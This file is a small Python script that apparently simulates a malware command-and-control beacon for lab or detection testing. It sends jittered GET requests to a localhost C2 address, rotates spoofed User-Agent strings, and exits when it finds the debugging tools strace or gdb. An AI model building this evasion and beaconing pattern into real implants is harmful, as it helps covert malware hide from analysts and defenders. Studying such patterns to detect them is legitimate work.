#!/usr/bin/env python3

import requests
import random
import time
import os
from datetime import datetime

C2_URL = "http://localhost:8080"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/7.81.0"
]

def anti_analysis():
    suspicious = ["/usr/bin/strace", "/usr/bin/gdb"]
    for tool in suspicious:
        if os.path.exists(tool):
            print("[!] Analysis tool detected. Exiting.")
            exit()

def beacon():
    headers = {
        "User-Agent": random.choice(USER_AGENTS)
    }

    try:
        r = requests.get(C2_URL, headers=headers)
        print(f"[{datetime.utcnow()}] Beacon sent | Status: {r.status_code}")
    except:
        print("[!] Connection failed")


if __name__ == "__main__":
    anti_analysis()

    while True:
        beacon()
        time.sleep(random.randint(5, 15))
